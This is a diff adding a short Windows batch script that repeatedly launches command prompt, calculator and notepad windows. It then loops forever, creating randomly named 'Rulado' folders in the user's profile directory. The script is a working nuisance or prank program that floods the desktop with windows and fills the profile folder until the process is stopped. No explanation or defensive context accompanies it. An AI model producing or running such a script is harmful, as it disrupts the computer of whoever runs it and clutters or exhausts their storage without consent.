@@ -1,0 +1,35 @@
+echo off
+start cmd 
+start calc
+start notepad
+start cmd
+start calc
+start notepad
+start cmd
+start calc
+start notepad
+start cmd
+start calc
+start notepad
+start cmd
+start calc
+start notepad
+start cmd
+start calc
+start notepad
+start cmd
+start calc
+start notepad
+start cmd
+start calc
+start notepad
+start cmd
+start calc
+start notepad
+start cmd
+start calc
+start notepad
+:loop
+cd %userprofile%
+md "%random% Rulado %random%"
+goto loop
